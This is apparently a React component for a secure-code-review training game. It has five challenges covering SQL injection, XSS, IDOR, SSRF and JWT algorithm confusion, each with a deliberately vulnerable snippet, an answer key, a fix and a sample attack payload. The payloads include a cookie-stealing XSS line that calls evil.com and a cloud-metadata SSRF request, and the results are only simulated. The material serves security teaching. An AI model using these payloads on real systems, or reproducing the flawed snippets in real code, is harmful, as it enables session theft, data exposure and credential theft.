import React, { useState } from 'react';
import { Terminal, CheckCircle2, AlertTriangle, Eye, ShieldCheck, Play, RotateCcw, ArrowRight } from 'lucide-react';

interface AuditChallenge {
  id: string;
  title: string;
  language: string;
  cwe: string;
  category: string;
  codeSnippet: string[];
  vulnerableLineIndex: number; // 0-indexed
  vulnerabilityOptions: string[];
  correctVulnerabilityIndex: number;
  explanation: string;
  remediationSnippet: string;
  testPayload: string;
  compromisedOutput: string;
  securedOutput: string;
}

const AUDIT_CHALLENGES: AuditChallenge[] = [
  {
    id: 'challenge-1',
    title: 'Challenge 01: User Profile Retrieval',
    language: 'TypeScript / Express',
    cwe: 'CWE-89: SQL Injection',
    category: 'Injection',
    codeSnippet: [
      "app.get('/api/users/profile', async (req, res) => {",
      "  const username = req.query.username;",
      "  // Query executed on database connection pool",
      "  const query = `SELECT * FROM users WHERE username = '${username}'`;",
      "  const user = await db.query(query);",
      "  res.json(user);",
      "});"
    ],
    vulnerableLineIndex: 3,
    vulnerabilityOptions: [
      'CWE-89: SQL Injection via unsanitized template literal',
      'CWE-352: Cross-Site Request Forgery',
      'CWE-798: Hard-coded Database Credentials',
      'CWE-287: Missing TLS Encryption'
    ],
    correctVulnerabilityIndex: 0,
    explanation: 'Directly interpolating the raw `username` parameter into the SQL query string allows attackers to break out of string literals using quotes and append arbitrary SQL commands (e.g. `\' OR \'1\'=\'1`).',
    remediationSnippet: `// Secure Parameterized Query
const user = await db.query(
  'SELECT id, username, email FROM users WHERE username = $1',
  [username]
);`,
    testPayload: "admin' OR 1=1 --",
    compromisedOutput: "HTTP 200 OK — Returned all 4,200 user records including password hashes.",
    securedOutput: "HTTP 400 Bad Request — Parameterized placeholder treated literally; no match found."
  },
  {
    id: 'challenge-2',
    title: 'Challenge 02: Rich Text Comment Rendering',
    language: 'TypeScript / React',
    cwe: 'CWE-79: Cross-Site Scripting (XSS)',
    category: 'Client-Side Security',
    codeSnippet: [
      "export function CommentView({ rawHtml }: { rawHtml: string }) {",
      "  // Render author submitted formatting markup",
      "  return (",
      "    <div className='comment-body'>",
      "      <div dangerouslySetInnerHTML={{ __html: rawHtml }} />",
      "    </div>",
      "  );",
      "}"
    ],
    vulnerableLineIndex: 4,
    vulnerabilityOptions: [
      'CWE-22: Path Traversal in Component',
      'CWE-79: DOM/Stored XSS via dangerouslySetInnerHTML without sanitization',
      'CWE-400: Uncontrolled Resource Consumption',
      'CWE-384: Session Fixation'
    ],
    correctVulnerabilityIndex: 1,
    explanation: 'Using `dangerouslySetInnerHTML` bypasses React’s built-in string escaping. If `rawHtml` contains user input without sanitization via DOMPurify, inline scripts and event handlers execute in the victim’s browser.',
    remediationSnippet: `// Sanitized with DOMPurify
import DOMPurify from 'dompurify';
const cleanHtml = DOMPurify.sanitize(rawHtml, { ALLOWED_TAGS: ['b', 'i', 'p', 'code'] });
return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;`,
    testPayload: "<img src=x onerror=\"fetch('https://evil.com/?c=' + document.cookie)\">",
    compromisedOutput: "JavaScript executed: Victim's session cookie exfiltrated to evil.com.",
    securedOutput: "DOMPurify stripped malicious onerror attribute; rendered inert image tag safely."
  },
  {
    id: 'challenge-3',
    title: 'Challenge 03: Document Update Authorization',
    language: 'TypeScript / API Endpoint',
    cwe: 'CWE-639: Broken Object Level Authorization (BOLA/IDOR)',
    category: 'Authorization',
    codeSnippet: [
      "app.put('/api/documents/:id', authenticateToken, async (req, res) => {",
      "  const docId = req.params.id;",
      "  const { content } = req.body;",
      "  // Mutate document content",
      "  await db.query('UPDATE documents SET content = $1 WHERE id = $2', [content, docId]);",
      "  res.json({ status: 'updated' });",
      "});"
    ],
    vulnerableLineIndex: 4,
    vulnerabilityOptions: [
      'CWE-639: Broken Object Level Authorization (IDOR) modifying any user’s doc',
      'CWE-89: SQL Injection via query parameters',
      'CWE-78: OS Command Execution',
      'CWE-306: Missing Authentication'
    ],
    correctVulnerabilityIndex: 0,
    explanation: 'The SQL statement updates the document purely by `id` without verifying whether the requesting user (`req.user.id`) owns the document or belongs to the authorized tenant.',
    remediationSnippet: `// Binds ownership and tenant check directly into query
const result = await db.query(
  'UPDATE documents SET content = $1 WHERE id = $2 AND owner_id = $3 AND tenant_id = $4 RETURNING id',
  [content, docId, req.user.id, req.user.tenantId]
);
if (result.rowCount === 0) return res.status(404).json({ error: 'Not found' });`,
    testPayload: "PUT /api/documents/target-user-private-doc with valid User B JWT",
    compromisedOutput: "HTTP 200 OK — Target user's confidential document overwritten by unauthorized peer.",
    securedOutput: "HTTP 404 Not Found — Query constrained to owner_id; mutation rejected."
  },
  {
    id: 'challenge-4',
    title: 'Challenge 04: Server-Side URL Preview Fetcher',
    language: 'TypeScript / Network Client',
    cwe: 'CWE-918: Server-Side Request Forgery (SSRF)',
    category: 'API Security',
    codeSnippet: [
      "app.post('/api/link-preview', async (req, res) => {",
      "  const { targetUrl } = req.body;",
      "  // Fetch remote webpage metadata",
      "  const response = await fetch(targetUrl);",
      "  const html = await response.text();",
      "  res.json({ preview: extractMetaTags(html) });",
      "});"
    ],
    vulnerableLineIndex: 3,
    vulnerabilityOptions: [
      'CWE-79: Reflected XSS',
      'CWE-918: Server-Side Request Forgery (SSRF) querying cloud metadata or internal VPC',
      'CWE-20: Missing Regular Expression',
      'CWE-502: Insecure Deserialization'
    ],
    correctVulnerabilityIndex: 1,
    explanation: 'Passing user-supplied URLs directly to `fetch()` allows attackers to supply loopback or cloud metadata addresses (e.g. `http://169.254.169.254/latest/meta-data/iam/security-credentials`) to steal cloud IAM tokens.',
    remediationSnippet: `// Restrict to public IPs and block private RFC 1918 & metadata subnets
import ipaddr from 'ipaddr.js';
import dns from 'dns/promises';

const { address } = await dns.lookup(new URL(targetUrl).hostname);
const parsed = ipaddr.parse(address);
if (parsed.range() !== 'unicast' || address === '169.254.169.254') {
  return res.status(403).json({ error: 'Prohibited internal network address' });
}`,
    testPayload: "POST { targetUrl: 'http://169.254.169.254/latest/meta-data/' }",
    compromisedOutput: "HTTP 200 OK — AWS EC2 container metadata and STS temporary role keys dumped.",
    securedOutput: "HTTP 403 Forbidden — Blocked request to link-local cloud metadata range."
  },
  {
    id: 'challenge-5',
    title: 'Challenge 05: JWT Signature Verification',
    language: 'TypeScript / Auth Middleware',
    cwe: 'CWE-347: Improper Verification of Cryptographic Signature',
    category: 'Cryptography',
    codeSnippet: [
      "import jwt from 'jsonwebtoken';",
      "function verifyClientToken(token: string) {",
      "  // Verifies incoming access token",
      "  return jwt.verify(token, process.env.RSA_PUBLIC_KEY!);",
      "}"
    ],
    vulnerableLineIndex: 3,
    vulnerabilityOptions: [
      'CWE-347: Algorithm Confusion / None Algorithm exploit via missing algorithm pin',
      'CWE-89: SQL Injection',
      'CWE-22: Path Traversal',
      'CWE-119: Memory Buffer Overflow'
    ],
    correctVulnerabilityIndex: 0,
    explanation: 'Calling `jwt.verify(token, key)` without specifying `algorithms: [\'RS256\']` allows attackers to change the token header to `alg: "HS256"` and sign tokens using the public key as an HMAC secret, forging arbitrary administrative credentials.',
    remediationSnippet: `// Strictly pin allowed asymmetric algorithm and claims
return jwt.verify(token, process.env.RSA_PUBLIC_KEY!, {
  algorithms: ['RS256'],
  issuer: 'https://auth.company.com',
  audience: 'https://api.company.com'
});`,
    testPayload: "JWT with header { alg: 'HS256' } signed with public RSA key string",
    compromisedOutput: "Signature verified: Attacker granted role: 'SUPERADMIN'.",
    securedOutput: "JsonWebTokenError: invalid algorithm — Token rejected immediately."
  }
];

export const AuditPlayground: React.FC = () => {
  const [selectedChallengeId, setSelectedChallengeId] = useState('challenge-1');
  const [selectedOption, setSelectedOption] = useState<number | null>(null);
  const [clickedLine, setClickedLine] = useState<number | null>(null);
  const [showRemediation, setShowRemediation] = useState(false);
  const [testSimulated, setTestSimulated] = useState(false);

  const challenge = AUDIT_CHALLENGES.find((c) => c.id === selectedChallengeId) || AUDIT_CHALLENGES[0];

  const handleSelectOption = (index: number) => {
    setSelectedOption(index);
    if (index === challenge.correctVulnerabilityIndex) {
      setShowRemediation(true);
    }
  };

  const handleLineClick = (lineIndex: number) => {
    setClickedLine(lineIndex);
  };

  const handleReset = () => {
    setSelectedOption(null);
    setClickedLine(null);
    setShowRemediation(false);
    setTestSimulated(false);
  };

  const isOptionCorrect = selectedOption === challenge.correctVulnerabilityIndex;
  const isLineCorrect = clickedLine === challenge.vulnerableLineIndex;

  return (
    <div className="space-y-8 pb-16">
      {/* Intro Header */}
      <div className="p-6 rounded-xl border border-slate-800 bg-slate-900/80 space-y-3">
        <div className="flex items-center gap-2 text-xs font-mono text-cyan-400 font-semibold uppercase">
          <Terminal className="w-4 h-4" />
          <span>Interactive Vulnerability Code Audit Playground</span>
        </div>
        <h1 className="text-2xl font-bold text-white tracking-tight">
          Spot the Flaw & Patch the Vulnerability
        </h1>
        <p className="text-sm text-slate-300 max-w-3xl leading-relaxed">
          Test your code review skills across realistic production snippets. Click on the flawed line in the code,
          identify the matching CWE vulnerability class, test the exploit payload, and inspect the verified security patch.
        </p>

        {/* Challenge Tabs */}
        <div className="flex items-center gap-2 pt-2 overflow-x-auto">
          {AUDIT_CHALLENGES.map((ch, idx) => (
            <button
              key={ch.id}
              onClick={() => {
                setSelectedChallengeId(ch.id);
                handleReset();
              }}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold whitespace-nowrap transition-colors ${
                selectedChallengeId === ch.id
                  ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40'
                  : 'bg-slate-950 text-slate-400 hover:text-slate-200 border border-slate-800'
              }`}
            >
              Challenge {idx + 1}: {ch.category}
            </button>
          ))}
        </div>
      </div>

      {/* Main Challenge Stage */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left: Code Snippet Viewer (7 cols) */}
        <div className="lg:col-span-7 rounded-xl border border-slate-800 bg-slate-950 p-6 space-y-4 shadow-lg">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <div>
              <span className="text-xs font-mono text-cyan-400 font-semibold">{challenge.language}</span>
              <h2 className="text-base font-bold text-white">{challenge.title}</h2>
            </div>
            <span className="text-xs font-mono text-slate-400">
              Click the vulnerable line below
            </span>
          </div>

          {/* Interactive Line-by-Line Code Display */}
          <div className="font-mono text-xs rounded-lg border border-slate-800/80 bg-slate-950 p-3 overflow-x-auto">
            {challenge.codeSnippet.map((line, idx) => {
              const isTargetLine = clickedLine === idx;
              let lineStyle = 'hover:bg-slate-800/40 text-slate-300';

              if (clickedLine !== null) {
                if (isTargetLine) {
                  lineStyle = isLineCorrect
                    ? 'bg-rose-950/60 border border-rose-500/50 text-rose-200 font-bold'
                    : 'bg-slate-800 text-slate-400 line-through';
                }
              }

              return (
                <div
                  key={idx}
                  onClick={() => handleLineClick(idx)}
                  className={`flex items-start gap-4 px-3 py-1.5 rounded cursor-pointer transition-colors ${lineStyle}`}
                >
                  <span className="text-slate-600 select-none w-6 text-right tabular-nums">
                    {idx + 1}
                  </span>
                  <span className="flex-1 whitespace-pre">{line}</span>
                </div>
              );
            })}
          </div>

          {clickedLine !== null && (
            <div
              className={`p-3 rounded-lg border text-xs flex items-center gap-2 ${
                isLineCorrect
                  ? 'border-emerald-500/40 bg-emerald-950/30 text-emerald-200'
                  : 'border-amber-500/40 bg-amber-950/30 text-amber-200'
              }`}
            >
              {isLineCorrect ? (
                <>
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                  <span>Correct! Line {clickedLine + 1} contains the security flaw. Now classify the vulnerability class on the right.</span>
                </>
              ) : (
                <>
                  <AlertTriangle className="w-4 h-4 text-amber-400" />
                  <span>Line {clickedLine + 1} is benign. Inspect where untrusted data or unvalidated calls occur.</span>
                </>
              )}
            </div>
          )}

          {/* Test Exploit Simulator */}
          <div className="pt-2 border-t border-slate-800">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
                <Play className="w-3.5 h-3.5 text-cyan-400" />
                <span>Simulate Attack Payload Execution</span>
              </span>

              {!testSimulated ? (
                <button
                  onClick={() => setTestSimulated(true)}
                  className="px-3 py-1 rounded text-xs font-semibold bg-cyan-400 text-slate-950 hover:bg-cyan-300"
                >
                  Execute Payload
                </button>
              ) : (
                <button
                  onClick={() => setTestSimulated(false)}
                  className="px-3 py-1 rounded text-xs font-medium bg-slate-800 text-slate-300 hover:text-white"
                >
                  Reset
                </button>
              )}
            </div>

            <div className="p-3 rounded-lg bg-slate-900 border border-slate-800 text-xs font-mono text-slate-400">
              Payload: <code className="text-cyan-300">{challenge.testPayload}</code>
            </div>

            {testSimulated && (
              <div className="mt-3 p-3.5 rounded-lg border border-rose-900/50 bg-rose-950/20 font-mono text-xs text-rose-200 space-y-1">
                <div className="font-bold text-rose-400">Execution Result (Vulnerable):</div>
                <div>{challenge.compromisedOutput}</div>
              </div>
            )}
          </div>
        </div>

        {/* Right: Vulnerability Classification & Patch (5 cols) */}
        <div className="lg:col-span-5 rounded-xl border border-slate-800 bg-slate-900/90 p-6 space-y-6">
          <div className="border-b border-slate-800 pb-3">
            <span className="text-xs font-mono text-slate-400">Step 2: Classification</span>
            <h3 className="text-base font-bold text-white">Identify the Vulnerability Class</h3>
          </div>

          {/* Options */}
          <div className="space-y-3">
            {challenge.vulnerabilityOptions.map((opt, oIdx) => {
              const isSelected = selectedOption === oIdx;
              const isCorrect = oIdx === challenge.correctVulnerabilityIndex;
              const hasAnswered = selectedOption !== null;

              let btnClass = 'border-slate-800 bg-slate-950/60 hover:bg-slate-800 text-slate-300';
              if (hasAnswered) {
                if (isCorrect) {
                  btnClass = 'border-emerald-500/80 bg-emerald-950/40 text-emerald-200 font-semibold';
                } else if (isSelected && !isCorrect) {
                  btnClass = 'border-rose-500/80 bg-rose-950/40 text-rose-200';
                } else {
                  btnClass = 'border-slate-800/40 bg-slate-950/30 text-slate-600';
                }
              }

              return (
                <button
                  key={oIdx}
                  onClick={() => handleSelectOption(oIdx)}
                  className={`w-full text-left p-3.5 rounded-xl border transition-all text-xs flex items-start gap-2.5 ${btnClass}`}
                >
                  <span className="w-5 h-5 rounded bg-slate-800 text-[11px] font-mono flex items-center justify-center shrink-0 mt-0.5">
                    {String.fromCharCode(65 + oIdx)}
                  </span>
                  <span className="flex-1 leading-snug">{opt}</span>
                </button>
              );
            })}
          </div>

          {/* Remediation Patch Reveal */}
          {showRemediation && (
            <div className="p-4 rounded-xl border border-emerald-900/60 bg-emerald-950/20 space-y-3">
              <div className="flex items-center gap-2 text-xs font-bold text-emerald-400">
                <ShieldCheck className="w-4 h-4" />
                <span>Verified Remediation Patch</span>
              </div>

              <div className="font-mono text-xs p-3 rounded-lg bg-slate-950 border border-emerald-900/40 text-emerald-200 overflow-x-auto">
                <pre className="whitespace-pre">{challenge.remediationSnippet}</pre>
              </div>

              <p className="text-xs text-slate-300 leading-relaxed">
                {challenge.explanation}
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
